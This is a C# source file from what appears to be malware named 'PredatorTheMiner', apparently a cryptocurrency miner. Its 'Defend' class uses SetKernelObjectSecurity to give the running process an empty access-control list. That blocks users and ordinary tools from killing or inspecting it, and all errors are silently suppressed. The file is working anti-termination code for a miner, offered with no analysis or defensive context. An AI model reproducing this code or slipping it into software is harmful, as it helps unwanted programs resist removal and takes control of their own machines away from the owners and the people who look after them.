﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace PredatorTheMiner
{
	public class RunTime
	{
		public class Defend
		{
			public enum DefendOptions
			{
				AntiWindows7 = 0,
			}

			public static void SetupDefend(DefendOptions dO)
			{
				try
				{
					if (dO == DefendOptions.AntiWindows7)
						ProcessSecure();
				}
				catch { }
			}

			[DllImport("Advapi32.dll")]
			private static extern bool SetKernelObjectSecurity(IntPtr Handle, SecurityInfos SecurityInformation, byte[] SecurityDescriptor);
			
			private static void ProcessSecure()
			{
				try
				{
					var sd = new RawSecurityDescriptor(ControlFlags.None, new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null), null, null, new RawAcl(2, 0));
					sd.SetFlags(ControlFlags.DiscretionaryAclPresent | ControlFlags.DiscretionaryAclDefaulted);
					var rawSd = new byte[sd.BinaryLength];
					sd.GetBinaryForm(rawSd, 0);
					if (!SetKernelObjectSecurity(Process.GetCurrentProcess().Handle, SecurityInfos.DiscretionaryAcl, rawSd))
						return;
				}
				catch { }
			}
		}
	}
}
